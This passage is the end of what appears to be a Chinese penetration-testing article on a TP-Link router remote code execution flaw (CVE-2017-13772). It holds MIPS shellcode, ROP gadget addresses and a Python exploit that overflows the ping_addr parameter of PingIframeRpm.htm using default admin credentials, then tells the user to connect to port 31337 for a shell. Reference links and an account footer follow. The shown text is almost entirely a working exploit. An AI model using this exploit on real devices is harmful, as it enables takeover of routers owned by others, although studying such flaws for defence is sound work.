    "\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x50\xff\xff\x9b\x89\xb9\xbc\x24\x0f"
    "\xff\xfd\x01\xe0\x28\x27\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50"
    "\x9b\x89\xb9\xbc\x28\x05\x01\x01\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f"
    "\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\xbd\x9b\x96\x46\x01\x01\x01\x0c"
    "\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce"
    "\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8"
    "\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c\x24\x02"
    "\x10\x46\x24\x0f\x03\x68\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa"
    "\x27\xa4\xfb\xfe\x01\x01\x01\x0c\x21\x8c\x11\x5c"
    )###### useful gadgets #######
nop = "\x22\x51\x44\x44"
gadg_1 = "\x2A\xB3\x7C\x60"
gadg_2 = "\x2A\xB1\x78\x40"
sleep_addr = "\x2a\xb3\x50\x90"
stack_gadg = "\x2A\xAF\x84\xC0"
call_code = "\x2A\xB2\xDC\xF0"
def first_exploit(url, auth):
#                      trash      $s1        $ra
    rop = "A"*164 + gadg_2  + gadg_1 + "B"*0x20 + sleep_addr
    rop += "C"*0x20 + call_code + "D"*4 + stack_gadg + nop*0x20 + shellcode
    params = {'ping_addr': rop, 'doType': 'ping', 'isNew': 'new', 'sendNum': '20', 'pSize': '64', 'overTime': '800', 'trHops': '20'}
    new_url = url + "PingIframeRpm.htm?" + urllib.urlencode(params)
    print "[debug] sending exploit..."
    print "[+] Please wait a few seconds before connecting to port 31337..."
    req = urllib2.Request(new_url) 
    req.add_header('Cookie', 'Authorization=Basic %s' %auth)
    req.add_header('Referer', url + "DiagnosticRpm.htm")                         
    resp = urllib2.urlopen(req)
if __name__ == '__main__':
    data = login("192.168.0.1", "admin", "admin")
    first_exploit(data[0], data[1])
```

**09**

参考

```
https://paper.seebug.org/434/
https://fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/
```

**EDI 安全**

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/rJALXSMzgel1Mr9bNoxTscUSdKdZ4QiaHPqKqtutcf1VxJFkhDPTP9xYpIIPrsibGWurZutjwXe3zgDqj374D3kw/640?wx_fmt=jpeg)

**扫二维码｜关注我们**

一个专注渗透实战经验分享的公众号